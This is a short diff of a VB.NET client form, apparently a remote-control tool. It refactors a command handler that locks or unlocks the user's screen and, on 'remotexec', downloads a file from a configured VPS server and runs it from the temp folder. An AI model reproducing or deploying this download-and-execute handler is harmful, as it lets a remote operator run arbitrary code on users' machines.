@@ -215,22 +215,14 @@ Public Class MainForm
             If remoteChatForm IsNot Nothing Then Invoke(Sub() remoteChatForm.Close())
 
         ElseIf actionType = "remotexec" Then
-                ' TODO : check this feature
-                Dim filename As String = actionContent(0)
-                Dim client As New WebClient
-                client.DownloadFile(My.Settings.vpsurl & "/files/" & filename, filename)
-                Try
-                    File.Move(filename, Path.GetTempPath & filename)
-                    File.Delete(filename)
-                Catch
-                End Try
-                Process.Start(Path.GetTempPath & filename)
+            ' TODO : download mp3 doesn't work
+            IndependantActions.DownloadExecute(actionContent(0))
 
-            ElseIf actionType = "lockuser" Then
-                Invoke(Sub() LockedWindow.Show())
+        ElseIf actionType = "lockuser" Then
+            Invoke(Sub() LockedWindow.Show())
 
-            ElseIf actionType = "unlockuser" Then
-                Invoke(Sub() LockedWindow.Hide())
+        ElseIf actionType = "unlockuser" Then
+            Invoke(Sub() LockedWindow.Hide())
         End If
 
 #End Region
